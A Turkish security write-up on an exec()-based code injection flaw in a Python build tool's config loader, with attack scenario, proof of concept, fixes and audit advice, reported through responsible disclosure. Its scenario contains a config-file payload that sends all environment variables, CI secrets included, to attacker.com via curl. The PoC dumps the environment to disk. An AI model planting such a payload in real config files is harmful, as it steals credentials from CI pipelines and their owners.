---
title: "Config Loader'daki exec() ile RCE: Build Sisteminiz Fazla Güvendiğinde"
date: 2026-03-23 01:00:00 +0300
categories: [write-up, source-code-analysis]
tags: [python, rce, code-injection, supply-chain, source-code-analysis]
---

CI/CD pipeline'larda kullanılan bir Python build/otomasyon aracını inceliyordum. Diğer sekmelerimi kapatıp dikkatimi toplamama neden olan bir şey buldum.

Aracın bir config yükleme fonksiyonu vardı. Basit konsept: bir Python config dosyasını oku, ayarları çıkar, dict olarak döndür. Binlerce projede bulunan türden bir utility fonksiyon. Tek farkla — bu `exec()` kullanıyordu. Ve dosya yolu kullanıcı girdisinden geliyordu.

Bu bir code smell değil. Bu dolu bir silah.

---

## Zafiyetli Kod

Projenin utility modülünün derinlerinde, konfigürasyon yükleyen bir fonksiyon:

```python
def load_config(config_path):
    """Load configuration from a Python file."""
    config = {}
    with open(config_path) as f:
        exec(f.read(), config)  # ← dosyanın tamamı, çalıştırılıyor
    return config
```

Ve çağıran kod:

```python
import os

config_file = os.environ.get("APP_CONFIG", "config/default.py")
settings = load_config(config_file)
```

Ne oluyor burada:

1. Config dosya yolu bir **environment variable**'dan geliyor — kullanıcı kontrollü
2. Fonksiyon o dosyayı açıp **tüm içeriğini** okuyor
3. İçeriğin tamamı `exec()`'e veriliyor — parse edilmiyor, doğrulanmıyor, **çalıştırılıyor**
4. O dosyada ne varsa tam Python yetkileriyle çalışıyor

Bu, tek satırda `startswith` kontrolü yapan bir `exec()` değil. Bu, dosya yolu kullanıcı tarafından kontrol edilen, dosyanın tamamını çalıştıran bir `exec()`. Zincirin hiçbir yerinde sanitizasyon yok.

---

## Bu Neden Farklı

`setup.py` versiyon parser'larındaki `exec()` yazılarını görmüşsündür — `__init__.py`'dan `__version__` okuyan fonksiyonlar. Bunlar kötü pratik ama exploit etmek için repo erişimi gerekiyor. Saldırganın projenin içindeki bir dosyayı değiştirmesi lazım.

Bu temelden farklı:

- **Dosya yolu dış girdi.** Saldırganın repoya dokunması gerekmiyor. *Hangi dosyanın* çalıştırılacağını kontrol ediyor.
- **Dosyanın tamamı çalıştırılıyor.** Tek satır değil, parse edilmiş bir değer değil — saldırganın seçtiği dosyanın tam içeriği.
- **Uygulama başlangıcında çalışıyor.** Kurulum sırasında değil, *runtime*'da. Araç her başladığında, environment variable'ın gösterdiği dosyayı exec() ediyor.

CI/CD bağlamında — bu aracın tipik kullanım yeri — environment variable'lar genellikle pipeline config'lerinden ayarlanıyor. Bu config'ler ana kod tabanından daha fazla kişinin erişimine açık repo'larda tutuluyor.

---

## Saldırı Senaryosu

**Ortam:** Bir geliştirme ekibi bu aracı CI/CD pipeline'ında kullanıyor. Araç config'ini `APP_CONFIG` environment variable'ından okuyor:

```yaml
# .github/workflows/build.yml
env:
  APP_CONFIG: config/production.py
```

**Saldırı:**

**Adım 1** — Saldırgan pipeline config'ine yazma erişimi kazanıyor. Göründüğünden daha düşük bir eşik — birçok ekip CI config'lerini junior developer'ların, yüklenicilerin, hatta dış katkıda bulunanların PR gönderebileceği repo'larda tutuyor.

**Adım 2** — Saldırgan `config/production.py`'ı değiştiriyor:

```python
# Üst kısım normal görünümlü config
DATABASE_HOST = "db.internal.company.com"
DATABASE_PORT = 5432
DEBUG = False
LOG_LEVEL = "INFO"

# 47. satırda gömülü payload
import subprocess, os, json
env_data = {k: v for k, v in os.environ.items()}
subprocess.run(["curl", "-X", "POST", "https://attacker.com/collect",
    "-d", json.dumps(env_data)], capture_output=True)
```

**Adım 3** — Pipeline çalışıyor. Araç config'i yüklüyor. `exec()` dosyanın tamamını çalıştırıyor. İlk dört satır meşru config değerleri atıyor. 47. satır her environment variable'ı dışarı sızdırıyor — `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_PASSWORD` ve o CI ortamında ne varsa.

**Adım 4** — Araç normal başlıyor. Config değerleri doğru. Log'lar temiz. Pipeline yeşil gösteriyor. Anahtarlar saldırganda.

---

## PoC

**Ortam**

```
Python   == 3.13.1
OS       == Windows 10
```

**Adım 1 — Zararlı config dosyası oluştur** (`evil_config.py`):

```python
# Normal bir config dosyası gibi görünüyor
APP_NAME = "production-api"
DEBUG = False
PORT = 8080

# 6. satır: payload
import os
with open("C:/PWNED.txt", "w") as f:
    f.write("RCE SUCCESS\n")
    f.write(f"User: {os.getlogin()}\n")
    f.write(f"CWD: {os.getcwd()}\n")
    f.write("Environment:\n")
    for k, v in os.environ.items():
        f.write(f"  {k}={v}\n")
```

**Adım 2 — Zafiyetli config loader'ı simüle et** (`poc.py`):

```python
import os

def load_config(config_path):
    config = {}
    with open(config_path) as f:
        exec(f.read(), config)
    return config

config_file = "evil_config.py"  # saldırgan kontrollü yol

settings = load_config(config_file)
print(f"[app] Loaded config: APP_NAME={settings.get('APP_NAME')}, PORT={settings.get('PORT')}")
print("[app] Application starting normally...")
```

**Adım 3 — Çalıştır:**

```
python poc.py
```

**Çıktı:**

```
[app] Loaded config: APP_NAME=production-api, PORT=8080
[app] Application starting normally...
```

Her şey normal görünüyor. Uygulama config'ini yükledi ve başladı. Ama `C:/PWNED.txt`'e bak:

```
RCE SUCCESS
User: Monster
CWD: C:\Users\Monster\projects\tool
Environment:
  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
  DATABASE_URL=postgres://admin:password@db.internal:5432/prod
  ...
```

Config doğru yüklendi. Uygulama çalışıyor. Environment diske döküldü. Hata yok. Uyarı yok. Uygulama log'larında iz yok.

---

## Düzeltme

**Seçenek A — Güvenli bir parser kullan:**

```python
import ast

def load_config(config_path):
    config = {}
    with open(config_path) as f:
        for line in f:
            line = line.strip()
            if '=' in line and not line.startswith('#'):
                key, value = line.split('=', 1)
                key = key.strip()
                value = value.strip()
                try:
                    config[key] = ast.literal_eval(value)
                except (ValueError, SyntaxError):
                    config[key] = value
    return config
```

**Seçenek B — Çalıştırılabilir olmayan config formatı kullan:**

```python
import json

def load_config(config_path):
    with open(config_path) as f:
        return json.load(f)
```

**Seçenek C — Python config dosyası kullanmak zorundaysan, yolu kısıtla:**

```python
import os

ALLOWED_CONFIG_DIR = "/etc/app/configs/"

def load_config(config_path):
    real_path = os.path.realpath(config_path)
    if not real_path.startswith(ALLOWED_CONFIG_DIR):
        raise ValueError(f"Config path {config_path} is outside allowed directory")
    # ... yine de exec() kullanma
```

Mesele şu: konfigürasyon okumak ile kod çalıştırmak farklı işlemler. `exec()` aradaki farkı bilmiyor. Senin kodun bilmeli.

---

## Denetlerken Nelere Dikkat Etmeli

Bu zafiyet sınıfı basit bir kalıp izliyor: **kullanıcı kontrollü girdi `exec()` veya `eval()`'a ulaşıyor.** Kod incelerken veri akışını takip et:

**Dosya yolu nereden geliyor?** Environment variable? CLI argümanı? HTTP parametresi? Veritabanı alanı? Bunlardan herhangi biri sistem admini dışında biri tarafından etkileniyorsa, sorunun var.

**Ne çalıştırılıyor?** Prefix kontrolü olan tek satır kötü. Dosyanın tamamı daha kötü. URL'den indirilen bir dosya felaket.

**Hangi bağlamda çalışıyor?** Bir geliştiricinin laptopu bir şey. Deployment secret'larına, cloud credential'larına ve production veritabanlarına erişimi olan bir CI/CD runner başka bir şey. Patlama yarıçapı önemli.

**`exec()` gerekli mi?** Gördüğüm her vakada cevap hayır. `json.load()`, `yaml.safe_load()`, `configparser`, `ast.literal_eval()` veya düz string parsing aynı işi yapar. Biri "esneklik için `exec()` lazım" diyorsa, aslında "kolaylık için keyfi kod çalıştırma lazım" diyor. Bunlar aynı şey değil.

---

## Referanslar

- **CWE-94**: Improper Control of Generation of Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/94.html)
- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/95.html)
- **OWASP Code Injection**: [owasp.org](https://owasp.org/www-community/attacks/Code_Injection)

---

## Disclosure

Bu zafiyet sorumlu açıklama programı aracılığıyla raporlanmış ve geliştiriciler tarafından doğrulanmıştır.

![Bounty Proof](/assets/img/bounty2.png)

---

Python `3.13.1` | Mart 2026
